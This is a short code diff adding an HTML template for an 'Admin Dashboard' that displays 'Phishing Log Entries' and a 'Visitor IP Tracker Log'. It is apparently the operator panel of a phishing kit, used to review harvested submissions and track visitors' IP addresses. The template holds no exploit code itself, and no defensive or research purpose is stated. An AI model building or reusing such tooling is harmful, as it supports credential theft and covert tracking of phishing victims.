@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><title>Admin Dashboard</title></head>
+<body>
+<h2>Phishing Log Entries</h2>
+<pre style="background:#f5f5f5; padding:10px; max-height:300px; overflow:auto;">
+{% for line in saved_logs %}
+{{ line }}
+{% endfor %}
+</pre>
+
+<h2>Visitor IP Tracker Log</h2>
+<pre style="background:#f5f5f5; padding:10px; max-height:300px; overflow:auto;">
+{% for line in visits_logs %}
+{{ line }}
+{% endfor %}
+</pre>
+
+<a href="/logout">Logout</a>
+</body>
+</html>
